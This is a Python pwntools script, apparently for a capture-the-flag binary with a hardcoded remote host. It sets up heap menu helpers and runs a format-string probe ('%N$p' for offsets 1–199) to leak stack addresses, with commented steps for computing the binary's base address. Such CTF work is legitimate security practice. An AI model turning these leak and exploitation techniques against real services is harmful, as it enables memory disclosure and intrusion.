#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
#libc = './libc.so.6'
#libc = ELF(libc, checksec=False)
context.log_level = 'error'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 24234

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================

def malloc(idx, size):
    io.sendlineafter(">>", "1")
    io.sendlineafter("Enter index:", str(idx).encode())
    io.sendlineafter("Enter size:", str(size).encode())

def free(idx):
    io.sendlineafter(">>", "2")
    io.sendlineafter("Enter index:", str(idx).encode())

def edit(idx, input):
    io.sendlineafter(">>", "3")
    io.sendlineafter("Enter index:", str(idx).encode())
    io.sendline(input)


def exploit(i):
    global io
    io = initialize()
    io.sendline("CC%%%d$p" % i)
#    malloc(0, 100)
#    edit(0, "AAAABBBB%%%d$p" % i)
#    io.recvuntil("Hello ")
    leak = io.recvline().decode()
#    main = int("0x"+leak[1],16)
#    target = int("0x"+leak[2],16)
#    elf.address = main - elf.sym["main"]
    print("%d - %s" % (i, leak))
    
if __name__ == '__main__':
    for i in range(1, 200):
     try:
      exploit(i)
      io.close()
     except:
      io.close()
